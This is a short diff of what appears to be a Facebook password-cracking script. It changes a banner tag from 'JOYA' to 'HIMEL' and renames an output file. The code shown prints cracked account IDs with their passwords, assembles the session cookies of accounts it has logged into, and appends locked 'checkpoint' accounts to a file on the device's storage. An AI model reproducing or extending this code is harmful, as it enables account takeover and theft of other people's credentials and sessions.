@@ -388,7 +388,7 @@ def fking1(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[31;47m [JOYA==>OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[31;47m [HIMEL==>OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                         print("")
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
@@ -405,7 +405,7 @@ def fking1(ids,passlist):
                                 else:
                                         print('\r\r\x1b[37;41m [HIMEL==>CP]\33[0;m '+str(uid)+' | '+pas+'\033[1;97m')
                                         print("")
-                                        open('/sdcard/F-HIMEL-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/HIMEL-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
